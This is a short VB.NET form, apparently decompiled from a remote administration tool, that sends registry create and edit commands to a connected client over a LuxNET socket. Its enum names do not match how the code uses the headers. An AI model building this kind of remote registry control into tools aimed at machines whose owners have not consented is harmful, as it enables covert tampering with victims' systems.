Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports LuxNET.LuxNET

Public Class Modify_Registry
    Public Sub New()
        Me.packer = New LuxNET.Pack
        Me.editing = False
        Me.InitializeComponent()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If Not Me.editing Then
            Me.SendPacket(New Object() {CByte(&H80), Me.path, Me.TextBox1.Text, Me.RichTextBox1.Text})
        Else
            Me.SendPacket(New Object() {CByte(&H81), Me.path, Me.TextBox1.Text, Me.RichTextBox1.Text})
            Me.editing = False
        End If
        Me.Close()
    End Sub
    Private Sub SendPacket(ByVal ParamArray args As Object())
        Dim data As Byte() = Me.packer.Serialize(args)
        Me.client.Send(data)
        GC.Collect()
    End Sub
    Public client As ServerClient
    Public editing As Boolean
    Private packer As LuxNET.Pack
    Public path As String

    ' Nested Types
    Public Enum PacketHeaders As Byte
        ' Fields
        CreateValue = &H81
        RegistryModify = &H80
    End Enum
End Class